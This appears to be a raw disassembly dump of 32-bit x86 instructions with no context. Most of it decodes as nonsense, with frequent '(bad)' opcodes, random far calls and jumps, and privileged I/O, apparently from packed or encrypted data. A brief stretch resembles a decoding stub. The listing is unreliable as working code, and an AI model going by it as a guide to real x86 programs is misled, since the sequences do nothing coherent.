  40303f:	fmul   QWORD PTR ds:0xee1e3a36
  403045:	pushf  
  403046:	mov    dh,0xa1
  403048:	lods   al,BYTE PTR ds:[esi]
  403049:	add    al,0x5f
  40304b:	mov    ebp,0x7e548573
  403050:	test   DWORD PTR ss:[eax],ecx
  403053:	pop    edx
  403054:	push   edi
  403055:	and    eax,0xae55b41
  40305a:	jns    0x403021
  40305c:	call   0xbef035cb
  403061:	pop    ebx
  403062:	add    cl,dl
  403064:	retf   0xa393
  403067:	add    al,0x6f
  403069:	cdq    
  40306a:	xchg   ebp,eax
  40306b:	ja     0x4030e9
  40306d:	(bad)  
  40306e:	leave  
  40306f:	sbb    BYTE PTR [ebx],bh
  403071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403072:	daa    
  403073:	retf   0x2149
  403076:	and    BYTE PTR [edi+0x2d],0xc
  40307a:	fist   WORD PTR [edi+0x40]
  40307d:	push   ebx
  40307e:	fsub   QWORD PTR [ebx-0x23]
  403081:	daa    
  403082:	aad    0xe5
  403084:	(bad)  
  403085:	and    DWORD PTR [eax+0x28],esp
  403088:	dec    esp
  403089:	(bad)  
  40308a:	adc    dl,bl
  40308c:	lea    ebx,[eax]
  40308e:	pushf  
  40308f:	sahf   
  403090:	gs loopne 0x403070
  403093:	sub    al,0x71
  403095:	xor    dh,bl
  403097:	mov    esp,0x3dcfd98c
  40309c:	iret   
  40309d:	fisub  DWORD PTR [ebx-0x631dc74b]
  4030a3:	cwde   
  4030a4:	(bad)  
  4030a5:	(bad)  
  4030a7:	popf   
  4030a8:	add    bh,0x5f
  4030ab:	inc    edx
  4030ac:	out    0xdd,al
  4030ae:	inc    ebp
  4030af:	inc    esp
  4030b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b1:	or     DWORD PTR [ebx],edi
  4030b3:	daa    
  4030b4:	imul   edi,DWORD PTR [ecx+ecx*1],0x65d27b46
  4030bb:	mov    eax,ds:0x54904610
  4030c0:	push   edi
  4030c1:	repnz cdq 
  4030c3:	test   edx,ebp
  4030c5:	jbe    0x4030b6
  4030c7:	push   0x0
  4030c9:	(bad)  
  4030ca:	iret   
  4030cb:	retf   0x7a19
  4030ce:	nop
  4030cf:	sti    
  4030d0:	mov    ch,bl
  4030d2:	mov    esp,0xdc873d6e
  4030d7:	sub    BYTE PTR [ebx-0x40],ch
  4030da:	mov    eax,cs
  4030dc:	cmp    cl,bh
  4030de:	and    BYTE PTR [edi],bl
  4030e0:	es (bad) 
  4030e3:	test   DWORD PTR [ecx+ebp*4+0x59a9730f],0x3c22087
  4030ee:	inc    edx
  4030ef:	cli    
  4030f0:	scas   al,BYTE PTR es:[edi]
  4030f1:	xor    bl,BYTE PTR ds:0x8963cb50
  4030f7:	cs mov ebp,0xaecc66f2
  4030fd:	int3   
  4030fe:	outs   dx,BYTE PTR ds:[esi]
  4030ff:	int    0x36
  403101:	pusha  
  403102:	dec    esp
  403103:	enter  0xe7cd,0x58
  403107:	cmp    al,0x9e
  403109:	test   al,0x1a
  40310b:	ds loop 0x4030d9
  40310e:	and    al,0x76
  403110:	inc    ecx
  403111:	pop    eax
  403112:	loopne 0x4030aa
  403114:	mov    ch,0x29
  403116:	pop    eax
  403117:	imul   esi,esi,0x23
  40311a:	jge    0x403130
  40311c:	jg     0x40313e
  40311e:	xchg   ebx,eax
  40311f:	xchg   cl,ah
  403121:	test   DWORD PTR [ebx-0x2d1afbb6],esp
  403127:	data16 into 
  403129:	adc    eax,0xd7cd1353
  40312e:	or     al,0x67
  403130:	and    ch,BYTE PTR [eax+0x59e902af]
  403136:	cmp    ebx,ecx
  403138:	js     0x4031b5
  40313a:	add    eax,0x2bb9d081
  40313f:	(bad)  
  403140:	or     eax,0xb1bc507f
  403145:	cmp    DWORD PTR [edi],ecx
  403147:	test   DWORD PTR [esi],edx
  403149:	adc    eax,0xa4f6edf1
  40314e:	sbb    bl,al
  403150:	cmp    eax,0xb5f18289
  403155:	jmp    0x15aa67c1
  40315a:	leave  
  40315b:	repz pop ebp
  40315d:	jno    0x4031d0
  40315f:	ds mov ebp,0x9cd995e3
  403165:	xor    bh,0xac
  403168:	cs mov ch,0x95
  40316b:	push   eax
  40316c:	sbb    DWORD PTR [edx-0x3ba6bf60],ebp
  403172:	xlat   BYTE PTR ds:[ebx]
  403173:	das    
  403174:	(bad)  
  403175:	into   
  403176:	aad    0x96
  403178:	mov    ecx,DWORD PTR [esp+eax*2-0x9132e58]
  40317f:	sbb    DWORD PTR [ecx-0x2046e5da],edi
  403185:	je     0x403182
  403187:	jnp    0x403171
  403189:	mov    ?,WORD PTR [edx-0x3f]
  40318c:	gs cmc 
  40318e:	push   eax
  40318f:	xor    ah,BYTE PTR [edx+0x1b06764d]
  403195:	xchg   edx,eax
  403196:	div    DWORD PTR [eax+0x5d]
  403199:	push   ecx
  40319a:	mov    ebx,0xd0a0c53a
  40319f:	test   DWORD PTR [ebx],eax
  4031a1:	mov    dl,0x9a
  4031a3:	add    DWORD PTR [esp+ebx*1+0x6529c8df],0xffffff83
  4031ab:	inc    eax
  4031ac:	repz pop esp
  4031ae:	mov    ch,0x22
  4031b0:	xchg   esp,eax
  4031b1:	loop   0x403227
  4031b3:	jb     0x403210
  4031b5:	js     0x4031dc
  4031b7:	cmp    ah,dl
  4031b9:	ret    
  4031ba:	mov    ss,WORD PTR [esi+0x53d9374a]
  4031c0:	xchg   edx,eax
  4031c1:	fadd   st,st(1)
  4031c3:	sub    DWORD PTR [bp-0x55e1],eax
  4031c8:	jg     0x40316a
  4031ca:	push   esi
  4031cb:	addr16 jp 0x4031f0
  4031ce:	mov    dh,0x7
  4031d0:	sbb    eax,0x65d88f72
  4031d5:	mov    DWORD PTR [edi],edx
  4031d7:	bound  esp,QWORD PTR [edx]
  4031d9:	inc    esi
  4031da:	jno    0x4031ac
  4031dc:	into   
  4031dd:	fstp   QWORD PTR [ecx+0x7a]
  4031e0:	fild   WORD PTR [esi]
  4031e2:	pxor   mm2,mm1
  4031e5:	sub    BYTE PTR [ebp-0x3bcfeb6d],bl
  4031eb:	clc    
  4031ec:	arpl   WORD PTR [ebx+0x29],sp
  4031ef:	add    edi,DWORD PTR [ebp+0x648b737b]
  4031f5:	call   0xa53d:0xb0b89a
  4031fc:	int3   
  4031fd:	push   ss
  4031fe:	dec    ebx
  4031ff:	ror    edi,1
  403201:	stos   BYTE PTR es:[edi],al
  403202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403203:	shr    dh,0xf0
  403206:	(bad)  
  403208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40320a:	jbe    0x403200
  40320c:	or     al,0xac
  40320e:	imul   esp,DWORD PTR [eax+0x1dced5d4],0x12
  403215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403217:	add    eax,0xafbc03fc
  40321c:	push   ecx
  40321d:	mov    dl,0x10
  40321f:	sub    al,0xc5
  403221:	cmp    ecx,DWORD PTR [edx-0x56]
  403224:	hlt    
  403225:	sahf   
  403226:	add    eax,0x3a865f99
  40322b:	jnp    0x4031e3
  40322d:	cwde   
  40322e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40322f:	test   DWORD PTR [esi],esp
  403231:	adc    edi,edx
  403233:	inc    edi
  403234:	pusha  
  403235:	jnp    0x403223
  403237:	mov    edx,0x1143967b
  40323c:	jge    0x40320e
  40323e:	leave  
  40323f:	loop   0x40322b
  403241:	out    0xa8,eax
  403243:	push   ebp
  403244:	and    BYTE PTR [esi+0x1af5456b],al
  40324a:	jp     0x4032c7
  40324c:	pop    edi
  40324d:	inc    eax
  40324e:	adc    ah,BYTE PTR [edx]
  403250:	cmc    
  403251:	mov    eax,0xe5f0f3d8
  403256:	sar    BYTE PTR [ebx+0x53d0b6b7],cl
  40325c:	push   0x6d8b2e40
  403261:	push   ebp
  403262:	retf   0xc350
  403265:	das    
  403266:	and    DWORD PTR [edi+0x64c8b05f],eax
  40326c:	int    0x15
  40326e:	bound  esp,QWORD PTR [edi+0x1011c520]
  403274:	fwait
  403275:	jnp    0x40324d
  403277:	je     0x40324e
  403279:	shl    DWORD PTR [ecx+0x4db3a283],0x78
  403280:	jnp    0x4032f9
  403282:	jo     0x40323d
  403284:	clc    
  403285:	dec    esi
  403286:	or     eax,0x5c86e258
  40328b:	ja     0x403247
  40328d:	lds    edi,FWORD PTR [ecx-0x7f23a6e1]
  403293:	arpl   WORD PTR [esi-0x3491c729],cx
  403299:	push   eax
  40329a:	aaa    
  40329b:	sub    dh,BYTE PTR [edx+edx*4]
  40329e:	dec    edi
  40329f:	ds cmp eax,0x939641f8
  4032a5:	xchg   edi,eax
  4032a6:	inc    ebx
  4032a7:	xchg   edi,eax
  4032a8:	test   al,0x60
  4032aa:	pop    edx
  4032ac:	aaa    
  4032ad:	push   0x45b7d8d8
  4032b2:	sub    ebp,0x54
  4032b5:	stc    
  4032b6:	push   cs
  4032b7:	data16 rcr BYTE PTR [edi*1-0x11e996f5],1
  4032bf:	push   ds
  4032c0:	ins    DWORD PTR es:[edi],dx
  4032c1:	dec    ebx
  4032c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032c3:	dec    ebx
  4032c4:	int3   
  4032c5:	xor    BYTE PTR [edi+0x6f],al
  4032c8:	psraw  mm4,QWORD PTR [esi+0x3f]
  4032cc:	mov    edx,0xd4a7e3af
  4032d1:	icebp  
  4032d2:	mov    bh,BYTE PTR [edi-0x51]
  4032d5:	lods   eax,DWORD PTR ds:[esi]
  4032d6:	cmp    edi,DWORD PTR [eax-0x37]
  4032d9:	test   eax,0xdc57abde
  4032de:	mov    esi,0xa779b05
  4032e3:	inc    eax
  4032e4:	inc    ebp
  4032e5:	mov    ah,0x53
  4032e7:	test   DWORD PTR ds:0x2fc12990,ecx
  4032ed:	or     esi,0x1150ed13
  4032f3:	test   al,0xa9
  4032f5:	sbb    BYTE PTR [edx],0x27
  4032f8:	push   0x32a06693
  4032fd:	pop    edx
  4032fe:	fs in  eax,dx
  403300:	jne    0x4032af
  403302:	sbb    bl,BYTE PTR [edx]
  403304:	pop    ebx
  403305:	xchg   ebp,eax
  403306:	xor    eax,0x404e7d3b
  40330b:	out    0x60,eax
  40330d:	jge    0x403366
  40330f:	hlt    
  403310:	cmc    
  403311:	mov    BYTE PTR [esi-0x242f886f],bl
  403317:	out    0x73,eax
  403319:	scas   al,BYTE PTR es:[edi]
  40331a:	mov    bl,0x7f
  40331c:	int3   
  40331d:	push   es
  40331e:	add    eax,ecx
  403320:	cwde   
  403321:	test   DWORD PTR [esi+0x27f4eb53],ecx
  403327:	enter  0xc0da,0x3a
  40332b:	(bad)  
  40332c:	pop    ecx
  40332d:	and    edi,DWORD PTR [edx-0x55ca4d84]
  403333:	jb     0x403334
  403335:	jmp    0x1600a98e
  40333a:	push   0xffffffa2
  40333c:	aaa    
  40333d:	retf   
  40333e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40333f:	or     DWORD PTR [ebp-0xce0709f],0x4
  403346:	cmp    dh,BYTE PTR [ecx]
  403348:	sti    
  403349:	adc    al,0x9e
  40334b:	jmp    FWORD PTR cs:[esi+0x43992fdb]
  403352:	inc    ebx
  403353:	add    DWORD PTR [eax+0x46d3959c],0x2eb5c2a9
  40335d:	and    DWORD PTR [ecx-0x28f0fccf],edi
  403363:	jo     0x4033e1
  403365:	xchg   edx,eax
  403366:	mov    ah,0xd8
  403368:	xor    al,0x35
  40336a:	iret   
  40336b:	inc    esp
  40336c:	fwait
  40336d:	lods   al,BYTE PTR ds:[esi]
  40336e:	xchg   ebp,eax
  40336f:	xor    esp,DWORD PTR [eax]
  403371:	out    dx,eax
  403372:	pop    eax
  403373:	dec    edx
  403374:	inc    ebx
  403375:	pop    eax
  403377:	rcr    ebp,cl
  403379:	jp     0x40335c
  40337b:	xchg   ebx,eax
  40337c:	add    BYTE PTR [edx],0x11
  40337f:	cld    
  403380:	or     eax,0x178e541b
  403385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403386:	push   ds
  403387:	loopne 0x4033e5
  403389:	adc    DWORD PTR [ecx-0x7e],eax
  40338c:	inc    esp
  40338d:	in     al,dx
  40338e:	xchg   ecx,eax
  40338f:	neg    DWORD PTR [edi+0xddc37c]
  403395:	dec    ebp
  403396:	dec    ebp
  403397:	test   al,0x8d
  403399:	stos   BYTE PTR es:[edi],al
  40339a:	fild   QWORD PTR [ebx+eiz*2-0x1a07d4c1]
  4033a1:	stc    
  4033a2:	lods   al,BYTE PTR ds:[esi]
  4033a3:	sub    al,0x30
  4033a5:	pushf  
  4033a6:	dec    esi
  4033a7:	rcl    BYTE PTR [eax],1
  4033a9:	shr    BYTE PTR [eax+0x72],0x61
  4033ad:	(bad)  
  4033ae:	ins    BYTE PTR es:[edi],dx
  4033af:	sub    eax,0x38be4f32
  4033b4:	xor    eax,0x6fec1d18
  4033b9:	pop    eax
  4033ba:	popa   
  4033bb:	in     al,0x31
  4033bd:	adc    BYTE PTR [ebx+0x3aed98ad],al
  4033c3:	std    
  4033c4:	inc    eax
  4033c5:	sub    BYTE PTR [ebx],0x89
  4033c8:	test   BYTE PTR [ebx+eiz*1-0x7b],0x56
  4033cd:	dec    eax
  4033ce:	push   cs
  4033cf:	inc    edi
  4033d0:	adc    DWORD PTR ds:0x99bfa776,ebx
  4033d6:	pop    edx
  4033d7:	dec    eax
  4033d8:	lds    esi,FWORD PTR [esi]
  4033da:	aam    0x7e
  4033dc:	mov    al,0x72
  4033de:	in     eax,dx
  4033df:	push   es
  4033e0:	sar    DWORD PTR [eax+0x741ec5c0],0xed
  4033e7:	and    al,0x74
  4033e9:	pop    eax
  4033ea:	lea    esi,[edi+0x1597ce93]
  4033f0:	(bad)  
  4033f2:	push   cs
  4033f3:	cwde   
  4033f4:	add    DWORD PTR [eax],ebx
  4033f6:	icebp  
  4033f7:	out    dx,al
  4033f8:	push   edi
  4033f9:	dec    ecx
  4033fa:	inc    ebx
  4033fb:	inc    ecx
  4033fc:	inc    esi
  4033fd:	aaa    
  4033fe:	cdq    
  4033ff:	retf   0x942c
  403402:	and    edi,DWORD PTR [eax+0x7edd6ebc]
  403408:	mov    edi,0xe057c3d8
  40340d:	in     eax,dx
  40340e:	inc    esp
  40340f:	adc    eax,0x9d6fec94
  403414:	add    eax,0xabcfd364
  403419:	mov    ch,0x88
  40341b:	fs dec ebp
  40341d:	mov    ds:0x13282858,eax
  403422:	test   eax,0xd0c9d5c8
  403427:	shl    BYTE PTR [ecx],0x55
  40342a:	add    DWORD PTR [ebx+0x148d20d0],ebx
  403430:	into   
  403431:	sahf   
  403432:	sub    al,0x22
  403434:	inc    eax
  403435:	jo     0x4034af
  403437:	je     0x4033de
  403439:	sub    edx,DWORD PTR [edx+0x10aaf9ca]
  40343f:	iret   
  403440:	fnstsw WORD PTR [ebx+0x2a]
  403443:	xchg   edx,eax
  403444:	mov    bh,0x43
  403446:	adc    DWORD PTR [ecx+0x781e79ac],edx
  40344c:	aad    0x85
  40344e:	sbb    ebp,DWORD PTR [ebp+0xd1299f2]
  403454:	ja     0x4033fd
  403456:	mov    ch,BYTE PTR [esi+0x8]
  403459:	fs dec edx
  40345b:	cwde   
  40345c:	or     eax,0xb4ab22ed
  403461:	pop    esp
  403462:	push   ebp
  403463:	stos   BYTE PTR es:[edi],al
  403464:	push   edi
  403465:	add    BYTE PTR [edi+0x23c94f64],dl
  40346b:	sub    ch,BYTE PTR [ebp+ebx*1+0x76ee8022]
  403472:	ss out 0x6c,al
  403475:	int    0x27
  403477:	dec    esp
  403478:	dec    edi
  403479:	imul   esi,DWORD PTR [esi+ebp*1-0x290febb0],0xff79e0dd
  403484:	or     BYTE PTR [ebp-0x56],cl
  403487:	push   0x5680d25e
  40348c:	mov    al,ds:0x78f39278
  403491:	mov    edi,0x3fa674b6
  403496:	leave  
  403497:	bound  esi,QWORD PTR [edi-0x232cad98]
  40349d:	bound  eax,QWORD PTR [ecx-0x50e9fd7c]
  4034a3:	(bad)  
  4034a5:	and    al,0x48
  4034a7:	sub    BYTE PTR [edx-0x672c15f7],dh
  4034ad:	or     eax,0xdd5a305f
  4034b2:	repnz in al,0x7a
  4034b5:	mov    WORD PTR [ebx],?
  4034b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b8:	adc    eax,0xbc1659e2
  4034bd:	lds    ebp,FWORD PTR [ebx-0x3de800f8]
  4034c3:	jl     0x4034bb
  4034c5:	cmp    al,0x4b
  4034c7:	and    al,0x61
  4034c9:	ret    0x6719
  4034cc:	rol    ch,1
  4034ce:	test   eax,0x773b4398
  4034d3:	aaa    
  4034d4:	cdq    
  4034d5:	imul   esi,DWORD PTR [eax-0x77],0xffffffe9
  4034d9:	aas    
  4034da:	popf   
  4034db:	fidiv  WORD PTR [edx]
  4034dd:	mov    dl,0x2c
  4034df:	mov    DWORD PTR [ebp-0xc],eax
  4034e2:	mov    DWORD PTR [ebp-0x28],0xf89c853d
  4034e9:	mov    eax,ds:0x42a2d9
  4034ee:	xor    eax,DWORD PTR ds:0x42a35d
  4034f4:	mov    ds:0x42a2d9,eax
  4034f9:	mov    BYTE PTR [ebp-0x11],0x67
  4034fd:	and    DWORD PTR ds:0x42a3a9,edi
  403503:	jmp    0x403a0e
  403508:	ror    edi,cl
  40350a:	iret   
  40350b:	(bad)  
  40350c:	rol    esi,cl
  40350e:	(bad)  
  403510:	stos   BYTE PTR es:[edi],al
  403511:	adc    al,0xb1
  403513:	jb     0x4034e8
  403515:	sub    edi,ebx
  403517:	das    
  403518:	(bad)  
  403519:	push   ds
  40351a:	js     0x403594
  40351c:	push   0x7c
  40351e:	js     0x403598
  403520:	mov    cl,0xd6
  403522:	push   esp
  403523:	lock or DWORD PTR [esi+0x20],0x60
  403528:	rcl    bl,cl
  40352a:	dec    edi
  40352b:	(bad)  
  40352c:	mov    ebp,0x3e72c146
  403531:	sbb    BYTE PTR [edi-0x266ab37b],bh
  403537:	mov    ebp,0xe2e0295d
  40353c:	adc    ebp,esp
  40353e:	stc    
  40353f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403540:	pusha  
  403541:	xchg   edi,eax
  403542:	push   0x1017a179
  403547:	push   eax
  403548:	std    
  403549:	pop    ss
  40354a:	jno    0x403549
  40354c:	mov    cl,al
  40354e:	push   ebp
  40354f:	loopne 0x4035cd
  403551:	fmul   DWORD PTR [esi]
  403553:	(bad)  
  403554:	into   
  403555:	pop    eax
  403556:	fcmovne st,st(0)
  403558:	test   DWORD PTR [ebx+0x76],edx
  40355b:	jmp    0x3eec9334
  403560:	fld    DWORD PTR [esi]
  403562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403563:	clc    
  403564:	and    eax,DWORD PTR [edx+ebp*1+0x1e94b415]
  40356b:	(bad)  
  40356c:	and    eax,0x31f8da81
  403571:	lea    esp,[edx]
  403573:	inc    esp
  403574:	sub    eax,0x4b8c0d55
  403579:	pop    edi
  40357a:	lods   eax,DWORD PTR ds:[esi]
  40357b:	sub    eax,0x9b1612cc
  403580:	stc    
  403581:	adc    eax,0x144f32c8
  403586:	push   ss
  403587:	dec    esi
  403588:	jle    0x403572
  40358a:	sub    edx,eax
  40358c:	ficom  DWORD PTR [ecx-0x22]
  40358f:	push   eax
  403590:	es aad 0xcb
  403593:	push   esp
  403594:	div    BYTE PTR [ebp+0x1a56fbc6]
  40359a:	xchg   esi,eax
  40359b:	clc    
  40359c:	and    al,0xdd
  40359e:	sar    BYTE PTR [ebx-0x6c],cl
  4035a1:	push   ebp
  4035a2:	ret    0x44c5
  4035a5:	inc    ebp
  4035a6:	sbb    bh,BYTE PTR [edx-0x785782c]
  4035ac:	mov    edi,0xb6718d83
  4035b2:	pop    esi
  4035b3:	cs xor cl,bl
  4035b6:	sbb    ebp,ebx
  4035b8:	sub    edi,DWORD PTR [esi+eax*1]
  4035bb:	or     bh,cl
  4035bd:	jb     0x4035f8
  4035bf:	jp     0x4035fb
  4035c1:	int    0x45
  4035c3:	xchg   ebx,eax
  4035c4:	xchg   edi,eax
  4035c5:	nop
  4035c6:	xchg   edx,eax
  4035c7:	repnz sbb DWORD PTR [ecx-0x3a],ecx
  4035cb:	stc    
  4035cc:	inc    esp
  4035cd:	jecxz  0x403623
  4035cf:	mov    esp,0xd46336f
  4035d4:	mov    WORD PTR [eax+0x40210b20],ss
  4035da:	mov    BYTE PTR [ebx+0x393bc404],al
  4035e0:	ror    BYTE PTR [ecx],cl
  4035e2:	pop    eax
  4035e3:	rcr    DWORD PTR [eax],1
  4035e5:	mov    ah,0xe7
  4035e7:	into   
  4035e8:	mov    cl,0x67
  4035ea:	xor    BYTE PTR [esi],cl
  4035ec:	and    eax,0x7c1251b
  4035f1:	and    esp,edx
  4035f3:	sub    eax,0x48728186
  4035f8:	xchg   ebx,eax
  4035f9:	add    edi,esi
  4035fb:	int    0xb0
  4035fd:	hlt    
  4035fe:	out    0x9c,eax
  403600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403601:	test   eax,0xdc1e5ee8
  403606:	xchg   edi,eax
  403607:	lea    ecx,[eax-0x55]
  40360a:	push   ds
  40360b:	mov    dl,0xa0
  40360d:	ja     0x4035c1
  40360f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403610:	scas   al,BYTE PTR es:[edi]
  403611:	cvtdq2ps xmm6,xmm1
  403614:	sub    eax,0xf18f7233
  403619:	das    
  40361a:	jbe    0x4035c5
  40361c:	cli    
  40361d:	(bad)  
  40361e:	nop
  40361f:	int3   
  403620:	cwde   
  403621:	sub    al,ah
  403623:	adc    esp,eax
  403625:	in     eax,0xee
  403627:	xor    eax,0x103bb3df
  40362c:	sbb    bl,ch
  40362e:	pop    ebp
  40362f:	int3   
  403630:	in     al,dx
  403631:	ror    bh,cl
  403633:	pop    ecx
  403634:	(bad)  
  403635:	enter  0xd782,0xf3
  403639:	nop
  40363a:	shl    BYTE PTR [ecx],cl
  40363c:	sti    
  40363d:	(bad)
  403640:	jnp    0x403666
  403642:	pusha  
  403643:	cwde   
  403644:	pushf  
  403645:	cmp    BYTE PTR [ebx+0x1f],ch
  403648:	lea    ebp,[edi+0x6a]
  40364b:	xor    ecx,ebp
  40364d:	xchg   esp,eax
  40364e:	pop    eax
  40364f:	mov    ss,WORD PTR [ebx+eiz*2]
  403652:	call   0x7fef:0xe4df383d
  403659:	adc    DWORD PTR [ebp-0x59],ebx
  40365c:	adc    BYTE PTR [esi+0x4fd68ba1],ch
  403662:	pushf  
  403663:	push   ebp
  403664:	push   edx
  403665:	icebp  
  403666:	outs   dx,BYTE PTR ds:[esi]
  403667:	and    eax,0xee8dfac9
  40366c:	call   0xb43b:0x87f57586
  403673:	or     eax,0xe43220c5
  403678:	xchg   esp,eax
  403679:	jg     0x403621
  40367b:	dec    ecx
  40367c:	push   es
  40367d:	xlat   BYTE PTR ds:[ebx]
  40367e:	or     edx,DWORD PTR [eax-0x32]
  403681:	(bad)  [esi+0x6032bdd8]
  403687:	mov    ecx,0x230e5d89
  40368c:	mov    bh,0x26
  40368e:	sbb    al,0xb1
  403690:	dec    esi
  403691:	xor    eax,DWORD PTR [ebx]
  403693:	dec    ebx
  403694:	add    ebx,esp
  403696:	rol    DWORD PTR [esi+ebp*1-0x570dc163],1
  40369d:	mov    dh,BYTE PTR [eax+0x2f2f3929]
  4036a3:	push   ss
  4036a4:	mov    ch,0xcd
  4036a6:	ins    BYTE PTR es:[edi],dx
  4036a7:	mov    ah,BYTE PTR [esp+edi*4]
  4036aa:	adc    BYTE PTR [esi+0x21323d88],dl
  4036b0:	test   DWORD PTR [ecx-0x67],esp
  4036b3:	inc    ebx
  4036b4:	push   0x23b6f1fa
  4036b9:	arpl   WORD PTR [ecx-0x4d],cx
  4036bc:	(bad)  
  4036bd:	clc    
  4036be:	mov    ecx,0x8b4a87a2
  4036c3:	or     al,0x38
  4036c5:	cli    
  4036c6:	add    al,0xb2
  4036c8:	in     al,dx
  4036c9:	pop    ss
  4036ca:	and    al,BYTE PTR [edi+0x1fc20963]
  4036d0:	iret   
  4036d1:	xchg   edx,eax
  4036d2:	fmulp  st(5),st
  4036d4:	rcl    BYTE PTR [eax],0x3c
  4036d7:	clc    
  4036d8:	inc    ebx
  4036d9:	and    al,0xdc
  4036db:	and    bh,dl
  4036dd:	addr16 pop esi
  4036df:	int3   
  4036e0:	push   ebp
  4036e1:	add    DWORD PTR [edi-0x586fd13],0xffffffec
  4036e8:	inc    edx
  4036e9:	xor    ch,BYTE PTR [edx-0x42412057]
  4036ef:	mov    dh,0x49
  4036f1:	add    BYTE PTR [ebp-0x15],cl
  4036f4:	fcomp  DWORD PTR [edi-0x57123c02]
  4036fa:	retf   
  4036fb:	shl    dl,0xee
  4036fe:	and    al,0x9e
  403700:	gs inc ebp
  403702:	push   eax
  403703:	ror    DWORD PTR [esi],cl
  403705:	fsubr  st,st(1)
  403707:	sub    BYTE PTR [edi],cl
  403709:	fs push esp
  40370b:	and    bl,dl
  40370d:	shl    DWORD PTR [esp+ebx*1],cl
  403710:	cwde   
  403711:	sub    al,0xf9
  403713:	inc    esp
  403714:	ret    
  403715:	retf   
  403716:	push   ecx
  403717:	dec    eax
  403718:	ins    BYTE PTR es:[edi],dx
  403719:	adc    edi,edi
  40371b:	add    eax,0xf86e2b46
  403720:	xchg   ebp,eax
  403721:	aaa    
  403722:	jmp    0xed7f:0xa3096b10
  403729:	fld    QWORD PTR [ebp+0x7b0384e6]
  40372f:	push   ecx
  403730:	arpl   WORD PTR [edi+ecx*4+0x2a7a40b8],bp
  403737:	push   0x8036e36a
  40373c:	or     esi,DWORD PTR [ebp+0x76]
  40373f:	jne    0x4037a8
  403741:	sub    ebp,DWORD PTR [esp+edi*2-0xd70a053]
  403748:	push   ebx
  403749:	xor    esp,edx
  40374b:	and    al,0x84
  40374d:	dec    ebp
  40374e:	inc    ebx
  40374f:	into   
  403750:	push   ebx
  403751:	call   0xfe360207
  403756:	retf   
  403757:	imul   esi,DWORD PTR [edi+ecx*2-0x7dab56d6],0x53
  40375f:	sbb    edi,DWORD PTR [esp+edx*2-0x18865f71]
  403766:	or     al,0x68
  403768:	push   edx
  403769:	imul   esp,DWORD PTR [edx+ecx*8],0x8aad3d8a
  403770:	(bad)  
  403771:	int3   
  403772:	test   eax,0xbf67356
  403777:	sbb    eax,0x83481f
  40377c:	cli    
  40377d:	mov    dh,0xa2
  40377f:	aas    
  403780:	(bad)  
  403781:	lods   eax,DWORD PTR ds:[esi]
  403782:	leave  
  403783:	sub    eax,esp
  403785:	in     al,0x9e
  403787:	or     eax,0xd4181d39
  40378c:	imul   ebp,ebp,0xff406b19
  403792:	push   edx
  403793:	daa    
  403794:	ja     0x40373f
  403796:	std    
  403797:	xlat   BYTE PTR ds:[ebx]
  403798:	fidivr DWORD PTR [ecx+esi*2+0x64]
  40379c:	xchg   esp,eax
  40379d:	cmp    bl,ah
  40379f:	adc    ebx,DWORD PTR [edx+0x5a]
  4037a2:	cld    
  4037a3:	xchg   ebp,eax
  4037a4:	pop    esi
  4037a5:	cwde   
  4037a6:	arpl   WORD PTR [edi-0x6],si
  4037a9:	test   al,0x45
  4037ab:	xlat   BYTE PTR ds:[ebx]
  4037ac:	pop    es
  4037ad:	stos   BYTE PTR es:[edi],al
  4037ae:	lds    ecx,FWORD PTR [ebp+0x36]
  4037b1:	jne    0x4037f3
  4037b3:	repz icebp 
  4037b5:	pop    es
  4037b6:	push   esp
  4037b7:	sbb    eax,0xc3c76f01
  4037bc:	pop    ebp
  4037bd:	adc    eax,0x84c9f6d0
  4037c2:	inc    edx
  4037c3:	in     eax,0x54
  4037c5:	adc    BYTE PTR [edx+esi*8-0x424c4843],0xa2
  4037cd:	shr    DWORD PTR [edi+0x51],1
  4037d0:	or     DWORD PTR [ecx+0x5a91ad2d],esp
  4037d6:	sub    eax,0xaf191ed3
  4037db:	add    al,BYTE PTR [ebx-0x7c]
  4037de:	push   ebx
  4037df:	push   edi
  4037e0:	pop    eax
  4037e1:	fs jb  0x4037d9
  4037e4:	ret    
  4037e5:	pop    ss
  4037e6:	test   al,0xbf
  4037e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037e9:	pop    edi
  4037ea:	sub    DWORD PTR [edx+edi*4+0x6d1d081c],edx
  4037f1:	ffreep st(5)
  4037f3:	pop    esp
  4037f4:	test   DWORD PTR [esp+ecx*2+0x790247cb],0x670e257a
  4037ff:	sub    al,0xa1
  403801:	in     eax,dx
  403802:	mov    dl,0xac
  403804:	and    DWORD PTR [edx+ebp*2-0x387dc504],eax
  40380b:	ss add edx,esp
  40380e:	(bad)  
  403810:	loopne 0x40381b
  403812:	xlat   BYTE PTR ds:[ebx]
  403813:	bound  ebx,QWORD PTR [ebx]
  403815:	pop    es
  403816:	mov    ecx,0x39077665
  40381b:	fmulp  st(5),st
  40381d:	mov    ah,0x15
  40381f:	dec    edi
  403820:	add    BYTE PTR [ebp*2-0x3a4037ff],0xc3
  403828:	in     eax,dx
  403829:	pop    edx
  40382a:	int3   
  40382b:	scas   al,BYTE PTR es:[edi]
  40382c:	xor    edi,esi
  40382e:	inc    esp
  40382f:	xor    BYTE PTR [edi+0x49],dh
  403832:	int3   
  403833:	iret   
  403834:	hlt    
  403835:	adc    dl,BYTE PTR [edi]
  403837:	adc    al,0xc7
  403839:	jge    0x40381d
  40383b:	inc    edi
  40383c:	push   ecx
  40383d:	rcl    DWORD PTR [ebx],cl
